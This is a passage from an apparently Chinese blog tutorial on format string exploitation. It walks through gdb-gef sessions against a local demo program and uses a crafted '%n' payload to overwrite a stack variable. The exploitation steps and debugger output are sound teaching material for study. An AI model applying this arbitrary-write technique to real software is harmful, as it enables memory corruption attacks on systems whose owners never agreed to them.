class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~/文档/print$ ./coverStack </span><br><span class="line">         <span class="number">1</span></span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">00000000000000000000000000000000000000000000000001</span></span><br><span class="line"><span class="number">50</span></span><br><span class="line"><span class="number">0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001</span></span><br><span class="line"><span class="number">100</span></span><br></pre></td></tr></table></figure><p>还是我们在 <code>2.2.2 栈数据泄露</code> 中使用的程序，我们尝试将 <code>arg4</code> 的值更改为任意值（比如 <code>0x00000040</code>，十进制 64），在 gdb 中可以看到得到 <code>arg4</code> 的地址 <code>0x00007fffffffded6</code>，那么我们构造格式字符串 <code>%016x%016x%032d%9$n\xd6\xde\xff\xff\xff\x7f\x00\x00</code>。<br>\1. <code>%016x%016x</code> 表示两个 32 字符宽的十六进制数，占 16 字节。<br>\2. <code>%032d</code> 占 32 字节，三个部分加起来就占了 16+16+32=64 字节，即把 <code>arg4</code> 赋值为 <code>0x00000040</code>。<br>\3. <code>\xd6\xde\xff\xff\xff\x7f\x00\x00</code> 表示 <code>arg4</code> 的地址，由于在 <code>%n</code> 后面所以不被计入。<br>\4. 格式字符串最后一部分 <code>%9$n</code> 也是最重要的一部分，由于 <code>\x00</code> 字符截断的原因，我们需要把 <code>arg4</code> 的地址放在最后。所以它的偏移可能不是 <code>8</code>，还需要我们进一步调试，这里暂且先用<code>偏移 8</code> 来解释。 <code>%9$n</code> 和上面的内容一样，表示格式字符串的第 9 个参数，即写入 <code>\xd6\xde\xff\xff\xff\x7f\x00\x00</code> 的地方，<code>printf()</code> 就是通过这个地址找到被覆盖的内容的。</p><p>首先，为了确定 arg4 在栈中的偏移，传入参数：<code>%016x.%016x.%022d.%11$p.\xd6\xde\xff\xff\xff\x7f\x00\x00</code> 用以区分出地址。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~/文档/print$ python2 -c &#x27;print(&quot;%016x.%016x.%022d.%11$p.\xd6\xde\xff\xff\xff\x7f\x00\x00&quot;)&#x27; &gt; text</span><br><span class="line">sakura@Kylin:~/文档/print$ gdb-gef fmtdemo</span><br><span class="line">gef➤  b printf</span><br><span class="line">gef➤  r &lt; text</span><br><span class="line"></span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────── registers ────</span><br><span class="line"><span class="meta">$</span><span class="language-bash">rax   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbx   : 0x0000000000401210  →  &lt;__libc_csu_init+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rcx   : 0xffffffff</span>        </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdx   : 0x88888888</span>        </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsp   : 0x00007fffffffdec8  →  0x00000000004011f6  →  &lt;main+128&gt; mov edi, 0xa</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbp   : 0x00007fffffffdf70  →  0x0000000000000000</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsi   : 0x1</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdi   : 0x00007fffffffdee0  →  0x30252e7836313025 (<span class="string">&quot;%016x.%0&quot;</span>?)</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rip   : 0x00007ffff7e17c90  →  &lt;<span class="built_in">printf</span>+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r8    : 0x00007fffffffded6  →  <span class="string">&quot;ABCDEFGH&quot;</span></span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r9    : 0x7c</span>              </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r10   : 0x00007ffff7fef8c0  →   pxor xmm0, xmm0</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r11   : 0x00007ffff7e17c90  →  &lt;<span class="built_in">printf</span>+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r12   : 0x0000000000401090  →  &lt;_start+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r13   : 0x00007fffffffe060  →  0x0000000000000001</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r14   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r15   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">eflags: [zero carry parity adjust sign <span class="built_in">trap</span> INTERRUPT direction overflow resume virtualx86 identification]</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">cs: 0x33 <span class="variable">$ss</span>: 0x2b <span class="variable">$ds</span>: 0x00 <span class="variable">$es</span>: 0x00 <span class="variable">$fs</span>: 0x00 <span class="variable">$gs</span>: 0x00</span> </span><br><span class="line">───────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0x00007fffffffdec8│+0x0000: 0x00000000004011f6  →  &lt;main+128&gt; mov edi, 0xa ← $rsp</span><br><span class="line">0x00007fffffffded0│+0x0008: 0x4241000000000000</span><br><span class="line">0x00007fffffffded8│+0x0010: 0x0000484746454443 (&quot;CDEFGH&quot;?)</span><br><span class="line">0x00007fffffffdee0│+0x0018: 0x30252e7836313025 ← $rdi</span><br><span class="line">0x00007fffffffdee8│+0x0020: 0x323230252e783631</span><br><span class="line">0x00007fffffffdef0│+0x0028: 0x2e70243131252e64</span><br><span class="line">0x00007fffffffdef8│+0x0030: 0x00007fffffffded6  →  &quot;ABCDEFGH&quot;</span><br><span class="line">0x00007fffffffdf00│+0x0038: 0x0000000000000000</span><br><span class="line">─────────────────────────────────────────────────────────────── code:x86:64 ────</span><br><span class="line">   0x7ffff7e17c81 &lt;fprintf+177&gt;    ret    </span><br><span class="line">   0x7ffff7e17c82 &lt;fprintf+178&gt;    call   0x7ffff7ee5a70 &lt;__stack_chk_fail&gt;</span><br><span class="line">   0x7ffff7e17c87                  nop    WORD PTR [rax+rax*1+0x0]</span><br><span class="line"> → 0x7ffff7e17c90 &lt;printf+0&gt;       endbr64 </span><br><span class="line">   0x7ffff7e17c94 &lt;printf+4&gt;       sub    rsp, 0xd8</span><br><span class="line">   0x7ffff7e17c9b &lt;printf+11&gt;      mov    r10, rdi</span><br><span class="line">   0x7ffff7e17c9e &lt;printf+14&gt;      mov    QWORD PTR [rsp+0x28], rsi</span><br><span class="line">   0x7ffff7e17ca3 &lt;printf+19&gt;      mov    QWORD PTR [rsp+0x30], rdx</span><br><span class="line">   0x7ffff7e17ca8 &lt;printf+24&gt;      mov    QWORD PTR [rsp+0x38], rcx</span><br><span class="line">─────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] Id 1, Name: <span class="string">&quot;fmtdemo&quot;</span>, stopped 0x7ffff7e17c90 <span class="keyword">in</span> <span class="built_in">printf</span> (), reason: BREAKPOINT</span></span><br><span class="line">───────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] 0x7ffff7e17c90 → <span class="built_in">printf</span>()</span></span><br><span class="line"><span class="meta">[#</span><span class="language-bash">1] 0x4011f6 → main()</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">0000000000000001.0000000088888888.-000000000000000000001.0x7fffffffded6.�����</span><br><span class="line">[Inferior 1 (process 24935) exited with code 012]</span><br><span class="line">gef➤  </span><br></pre></td></tr></table></figure><p>经过不断调试，最终我们找到了我们写入的参数的位置 <code>偏移：10</code>，接下来就是写入了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~/文档/print$ python2 -c &#x27;print(&quot;%016x%016x%032d%11$n.\xd6\xde\xff\xff\xff\x7f\x00\x00&quot;)&#x27; &gt; text</span><br><span class="line">sakura@Kylin:~/文档/print$ gdb-gef fmtdemo</span><br><span class="line">Reading symbols from fmtdemo...</span><br><span class="line">GEF for linux ready, type `gef&#x27; to start, `gef config&#x27; to configure</span><br><span class="line">88 commands loaded and 5 functions added for GDB 9.1 in 0.01ms using Python engine 3.8</span><br><span class="line">gef➤  b printf</span><br><span class="line">Breakpoint 1 at 0x401070</span><br><span class="line">gef➤  r &lt; text</span><br><span class="line">Starting program: /home/sakura/文档/print/fmtdemo &lt; text</span><br><span class="line">[*] Failed to find objfile or not a valid file format: [Errno 2] 没有那个文件或目录: &#x27;system-supplied DSO at 0x7ffff7fcd000&#x27;</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x00007ffff7e17c90 in printf () from /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line"></span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────── registers ────</span><br><span class="line"><span class="meta">$</span><span class="language-bash">rax   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbx   : 0x0000000000401210  →  &lt;__libc_csu_init+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rcx   : 0xffffffff</span>        </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdx   : 0x88888888</span>        </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsp   : 0x00007fffffffdec8  →  0x00000000004011f6  →  &lt;main+128&gt; mov edi, 0xa</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbp   : 0x00007fffffffdf70  →  0x0000000000000000</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsi   : 0x1</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdi   : 0x00007fffffffdee0  →  0x3130257836313025 (<span class="string">&quot;%016x%01&quot;</span>?)</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rip   : 0x00007ffff7e17c90  →  &lt;<span class="built_in">printf</span>+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r8    : 0x00007fffffffded6  →  <span class="string">&quot;ABCDEFGH&quot;</span></span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r9    : 0x7c</span>              </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r10   : 0x00007ffff7fef8c0  →   pxor xmm0, xmm0</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r11   : 0x00007ffff7e17c90  →  &lt;<span class="built_in">printf</span>+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r12   : 0x0000000000401090  →  &lt;_start+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r13   : 0x00007fffffffe060  →  0x0000000000000001</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r14   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r15   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">eflags: [zero carry parity adjust sign <span class="built_in">trap</span> INTERRUPT direction overflow resume virtualx86 identification]</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">cs: 0x33 <span class="variable">$ss</span>: 0x2b <span class="variable">$ds</span>: 0x00 <span class="variable">$es</span>: 0x00 <span class="variable">$fs</span>: 0x00 <span class="variable">$gs</span>: 0x00</span> </span><br><span class="line">───────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0x00007fffffffdec8│+0x0000: 0x00000000004011f6  →  &lt;main+128&gt; mov edi, 0xa ← $rsp</span><br><span class="line">0x00007fffffffded0│+0x0008: 0x4241000000000000</span><br><span class="line">0x00007fffffffded8│+0x0010: 0x0000484746454443 (&quot;CDEFGH&quot;?)</span><br><span class="line">0x00007fffffffdee0│+0x0018: 0x3130257836313025 ← $rdi</span><br><span class="line">0x00007fffffffdee8│+0x0020: 0x2564323330257836</span><br><span class="line">0x00007fffffffdef0│+0x0028: 0xffded62e6e243131</span><br><span class="line">0x00007fffffffdef8│+0x0030: 0x00000000007fffff</span><br><span class="line">0x00007fffffffdf00│+0x0038: 0x0000000000000000</span><br><span class="line">─────────────────────────────────────────────────────────────── code:x86:64 ────</span><br><span class="line">   0x7ffff7e17c81 &lt;fprintf+177&gt;    ret    </span><br><span class="line">   0x7ffff7e17c82 &lt;fprintf+178&gt;    call   0x7ffff7ee5a70 &lt;__stack_chk_fail&gt;</span><br><span class="line">   0x7ffff7e17c87                  nop    WORD PTR [rax+rax*1+0x0]</span><br><span class="line"> → 0x7ffff7e17c90 &lt;printf+0&gt;       endbr64 </span><br><span class="line">   0x7ffff7e17c94 &lt;printf+4&gt;       sub    rsp, 0xd8</span><br><span class="line">   0x7ffff7e17c9b &lt;printf+11&gt;      mov    r10, rdi</span><br><span class="line">   0x7ffff7e17c9e &lt;printf+14&gt;      mov    QWORD PTR [rsp+0x28], rsi</span><br><span class="line">   0x7ffff7e17ca3 &lt;printf+19&gt;      mov    QWORD PTR [rsp+0x30], rdx</span><br><span class="line">   0x7ffff7e17ca8 &lt;printf+24&gt;      mov    QWORD PTR [rsp+0x38], rcx</span><br><span class="line">─────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] Id 1, Name: <span class="string">&quot;fmtdemo&quot;</span>, stopped 0x7ffff7e17c90 <span class="keyword">in</span> <span class="built_in">printf</span> (), reason: BREAKPOINT</span></span><br><span class="line">───────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] 0x7ffff7e17c90 → <span class="built_in">printf</span>()</span></span><br><span class="line"><span class="meta">[#</span><span class="language-bash">1] 0x4011f6 → main()</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤</span><br></pre></td></tr></table></figure><p>我们发现地址未对齐，调整我们传入的参数，使得地址对齐。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~/文档/print$ python2 -c &#x27;print(&quot;%016x%016x%032d%11$n....\xd6\xde\xff\xff\xff\x7f\x00\x00&quot;)&#x27; &gt; text</span><br><span class="line">sakura@Kylin:~/文档/print$ gdb-gef fmtdemo</span><br><span class="line">Reading symbols from fmtdemo...</span><br><span class="line">GEF for linux ready, type `gef&#x27; to start, `gef config&#x27; to configure</span><br><span class="line">88 commands loaded and 5 functions added for GDB 9.1 in 0.00ms using Python engine 3.8</span><br><span class="line">gef➤  b printf</span><br><span class="line">Breakpoint 1 at 0x401070</span><br><span class="line">gef➤  r &lt; text</span><br><span class="line">Starting program: /home/sakura/文档/print/fmtdemo &lt; text</span><br><span class="line">[*] Failed to find objfile or not a valid file format: [Errno 2] 没有那个文件或目录: &#x27;system-supplied DSO at 0x7ffff7fcd000&#x27;</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x00007ffff7e17c90 in printf () from /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line"></span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────── registers ────</span><br><span class="line"><span class="meta">$</span><span class="language-bash">rax   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbx   : 0x0000000000401210  →  &lt;__libc_csu_init+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rcx   : 0xffffffff</span>        </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdx   : 0x88888888</span>        </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsp   : 0x00007fffffffdec8  →  0x00000000004011f6  →  &lt;main+128&gt; mov edi, 0xa</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbp   : 0x00007fffffffdf70  →  0x0000000000000000</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsi   : 0x1</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdi   : 0x00007fffffffdee0  →  0x3130257836313025 (<span class="string">&quot;%016x%01&quot;</span>?)</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rip   : 0x00007ffff7e17c90  →  &lt;<span class="built_in">printf</span>+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r8    : 0x00007fffffffded6  →  <span class="string">&quot;ABCDEFGH&quot;</span></span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r9    : 0x7c</span>              </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r10   : 0x00007ffff7fef8c0  →   pxor xmm0, xmm0</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r11   : 0x00007ffff7e17c90  →  &lt;<span class="built_in">printf</span>+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r12   : 0x0000000000401090  →  &lt;_start+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r13   : 0x00007fffffffe060  →  0x0000000000000001</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r14   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r15   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">eflags: [zero carry parity adjust sign <span class="built_in">trap</span> INTERRUPT direction overflow resume virtualx86 identification]</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">cs: 0x33 <span class="variable">$ss</span>: 0x2b <span class="variable">$ds</span>: 0x00 <span class="variable">$es</span>: 0x00 <span class="variable">$fs</span>: 0x00 <span class="variable">$gs</span>: 0x00</span> </span><br><span class="line">───────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0x00007fffffffdec8│+0x0000: 0x00000000004011f6  →  &lt;main+128&gt; mov edi, 0xa ← $rsp</span><br><span class="line">0x00007fffffffded0│+0x0008: 0x4241000000000000</span><br><span class="line">0x00007fffffffded8│+0x0010: 0x0000484746454443 (&quot;CDEFGH&quot;?)</span><br><span class="line">0x00007fffffffdee0│+0x0018: 0x3130257836313025 ← $rdi</span><br><span class="line">0x00007fffffffdee8│+0x0020: 0x2564323330257836</span><br><span class="line">0x00007fffffffdef0│+0x0028: 0x2e2e2e2e6e243131</span><br><span class="line">0x00007fffffffdef8│+0x0030: 0x00007fffffffded6  →  &quot;ABCDEFGH&quot;</span><br><span class="line">0x00007fffffffdf00│+0x0038: 0x0000000000000000</span><br><span class="line">─────────────────────────────────────────────────────────────── code:x86:64 ────</span><br><span class="line">   0x7ffff7e17c81 &lt;fprintf+177&gt;    ret    </span><br><span class="line">   0x7ffff7e17c82 &lt;fprintf+178&gt;    call   0x7ffff7ee5a70 &lt;__stack_chk_fail&gt;</span><br><span class="line">   0x7ffff7e17c87                  nop    WORD PTR [rax+rax*1+0x0]</span><br><span class="line"> → 0x7ffff7e17c90 &lt;printf+0&gt;       endbr64 </span><br><span class="line">   0x7ffff7e17c94 &lt;printf+4&gt;       sub    rsp, 0xd8</span><br><span class="line">   0x7ffff7e17c9b &lt;printf+11&gt;      mov    r10, rdi</span><br><span class="line">   0x7ffff7e17c9e &lt;printf+14&gt;      mov    QWORD PTR [rsp+0x28], rsi</span><br><span class="line">   0x7ffff7e17ca3 &lt;printf+19&gt;      mov    QWORD PTR [rsp+0x30], rdx</span><br><span class="line">   0x7ffff7e17ca8 &lt;printf+24&gt;      mov    QWORD PTR [rsp+0x38], rcx</span><br><span class="line">─────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] Id 1, Name: <span class="string">&quot;fmtdemo&quot;</span>, stopped 0x7ffff7e17c90 <span class="keyword">in</span> <span class="built_in">printf</span> (), reason: BREAKPOINT</span></span><br><span class="line">───────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] 0x7ffff7e17c90 → <span class="built_in">printf</span>()</span></span><br><span class="line"><span class="meta">[#</span><span class="language-bash">1] 0x4011f6 → main()</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  x/20g $rsp</span><br><span class="line">0x7fffffffdec8:0x4011f60x4241000000000000</span><br><span class="line">0x7fffffffded8:0x4847464544430x3130257836313025</span><br><span class="line">0x7fffffffdee8:0x25643233302578360x2e2e2e2e6e243131</span><br><span class="line">0x7fffffffdef8:0x7fffffffded60x0</span><br><span class="line">0x7fffffffdf08:0x00x400040</span><br><span class="line">0x7fffffffdf18:0xf0b5ff0xc2</span><br><span class="line">0x7fffffffdf28:0x7fffffffdf570x7fffffffdf56</span><br><span class="line">0x7fffffffdf38:0x40125d0x7ffff7fa72e8</span><br><span class="line">0x7fffffffdf48:0x4012100x0</span><br><span class="line">0x7fffffffdf58:0x4010900xffffffffffffe060</span><br><span class="line">gef➤  finish</span><br><span class="line">Run till exit from #0  0x00007ffff7e17c90 in printf () from /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">main () at fmtdemo.c:8</span><br><span class="line">8    printf(&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────── registers ────</span><br><span class="line"><span class="meta">$</span><span class="language-bash">rax   : 0x4a</span>              </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbx   : 0x0000000000401210  →  &lt;__libc_csu_init+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rcx   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdx   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsp   : 0x00007fffffffded0  →  0x0040000000000000</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbp   : 0x00007fffffffdf70  →  0x0000000000000000</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsi   : 0xffffded62e2e2e2e</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdi   : 0x00007ffff7fa47e0  →  0x0000000000000000</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rip   : 0x00000000004011f6  →  &lt;main+128&gt; mov edi, 0xa</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r8    : 0xffffffff</span>        </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r9    : 0x4a</span>              </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r10   : 0x00007fffffffd3d0  →  0x0000000000000001</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r11   : 0x6e</span>              </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r12   : 0x0000000000401090  →  &lt;_start+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r13   : 0x00007fffffffe060  →  0x0000000000000001</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r14   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r15   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">eflags: [zero carry parity adjust sign <span class="built_in">trap</span> INTERRUPT direction overflow resume virtualx86 identification]</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">cs: 0x33 <span class="variable">$ss</span>: 0x2b <span class="variable">$ds</span>: 0x00 <span class="variable">$es</span>: 0x00 <span class="variable">$fs</span>: 0x00 <span class="variable">$gs</span>: 0x00</span> </span><br><span class="line">───────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0x00007fffffffded0│+0x0000: 0x0040000000000000 ← $rsp</span><br><span class="line">0x00007fffffffded8│+0x0008: 0x0000484746450000</span><br><span class="line">0x00007fffffffdee0│+0x0010: 0x3130257836313025</span><br><span class="line">0x00007fffffffdee8│+0x0018: 0x2564323330257836</span><br><span class="line">0x00007fffffffdef0│+0x0020: 0x2e2e2e2e6e243131</span><br><span class="line">0x00007fffffffdef8│+0x0028: 0x00007fffffffded6  →  0x4847464500000040 (&quot;@&quot;?)</span><br><span class="line">0x00007fffffffdf00│+0x0030: 0x0000000000000000</span><br><span class="line">0x00007fffffffdf08│+0x0038: 0x0000000000000000</span><br><span 